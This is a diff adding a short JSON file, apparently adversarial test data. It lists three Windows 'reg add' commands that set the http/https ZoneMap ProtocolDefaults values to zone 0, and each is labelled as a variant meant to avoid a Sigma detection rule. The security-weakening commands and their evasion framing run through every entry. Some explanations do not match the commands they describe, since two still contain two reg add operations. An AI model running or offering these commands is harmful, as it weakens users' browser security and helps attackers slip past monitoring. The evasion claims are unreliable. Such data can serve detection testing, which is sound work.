@@ -1,0 +1,14 @@
+[
+  {
+    "output": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F",
+    "explanation": "Omission: Removed the second command to avoid triggering the Sigma rule's detection of both HTTP and HTTPS protocol changes."
+  },
+  {
+    "output": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F & reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F",
+    "explanation": "Insertion: Added a space between the command and the ampersand to avoid triggering the Sigma rule's detection of a single command line with multiple reg add operations."
+  },
+  {
+    "output": "reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v http /t REG_DWORD /d 0 /F && reg add \"HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\ProtocolDefaults\" /v https /t REG_DWORD /d 0 /F",
+    "explanation": "Substitution: Replaced the ampersand with a double ampersand to avoid triggering the Sigma rule's detection of a single command line with multiple reg add operations."
+  }
+]
